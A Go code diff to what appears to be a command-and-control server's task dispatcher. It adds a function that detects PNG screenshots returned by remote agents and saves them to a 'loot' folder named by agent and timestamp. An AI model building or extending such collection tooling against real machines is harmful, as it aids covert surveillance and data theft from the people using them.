@@ -1,6 +1,9 @@
 package task
 
 import (
+	"fmt"
+	"os"
+	"path/filepath"
 	"time"
 
 	"github.com/google/uuid"
@@ -80,7 +83,35 @@ func (d *Dispatcher) ProcessResult(result *protocol.TaskResult) error {
 		return err
 	}
 
+	// Auto-save screenshots and downloads to disk
+	if len(result.Output) > 0 && result.Error == "" {
+		d.autoSaveLoot(result)
+	}
+
 	return d.database.UpdateTaskStatus(result.TaskID, status)
+}
+
+// autoSaveLoot saves screenshots and binary data to the loot directory.
+func (d *Dispatcher) autoSaveLoot(result *protocol.TaskResult) {
+	// Detect PNG screenshots by magic bytes
+	if len(result.Output) > 8 && result.Output[0] == 0x89 && result.Output[1] == 0x50 &&
+		result.Output[2] == 0x4E && result.Output[3] == 0x47 {
+
+		lootDir := "loot"
+		os.MkdirAll(lootDir, 0755)
+
+		agent, _ := d.database.GetAgent(result.AgentID)
+		agentName := "unknown"
+		if agent != nil {
+			agentName = agent.Name
+		}
+
+		timestamp := time.Now().Format("20060102-150405")
+		filename := filepath.Join(lootDir, fmt.Sprintf("%s_%s_screenshot.png", agentName, timestamp))
+		if err := os.WriteFile(filename, result.Output, 0644); err == nil {
+			fmt.Printf("  \033[32m[+]\033[0m Screenshot saved: %s (%d bytes)\n", filename, len(result.Output))
+		}
+	}
 }
 
 // GetTaskHistory returns all tasks for an agent.
